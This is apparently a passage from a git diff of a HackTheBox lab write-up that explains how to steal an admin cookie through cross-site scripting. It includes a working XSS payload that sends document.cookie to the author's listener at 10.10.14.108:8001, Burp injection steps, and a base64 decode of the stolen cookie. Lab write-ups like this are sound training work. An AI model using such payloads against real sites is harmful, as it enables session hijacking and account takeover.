@@ -92,3 +92,20 @@ You will see that the URL is reached. Introduce some random data into the webpag
 ```
 
 Observe the terms `{IP}:{port}`in the previous command line (CL). The CL is generic and won't work. You have to find your IP address and use the port of the server built in step 1. To know your IP address type in a new terminal `ifconfig` and you must see your personal IP and the IP assigned to your HTB VPN. The IP from the VPN is the one you have to use. In my situation is `10.10.14.108` so my XSS injection is `<script>var i=new Image(); i.src="http://10.10.14.108:8001/?cookie="+btoa(document.cookie);</script>`.
+
+Introduce this CL into Burp-suite in `User-Agent` field and forward the communication. If no results appear add it too into the `message` field and click on forward.
+
+(pic8)
+
+You will receive the following outcome in your server CLI:
+
+(pic13)
+
+Congratulations! You got the admin cookie. Now you have to decode it. Your XSS-injection script was encoded in binary 64 ensuring safe transmission via URL. So now you have to decode it. For that open a new CLI and run: 
+
+```
+echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
+```
+The outcome is the decoded admin cookie:
+
+(pic14)
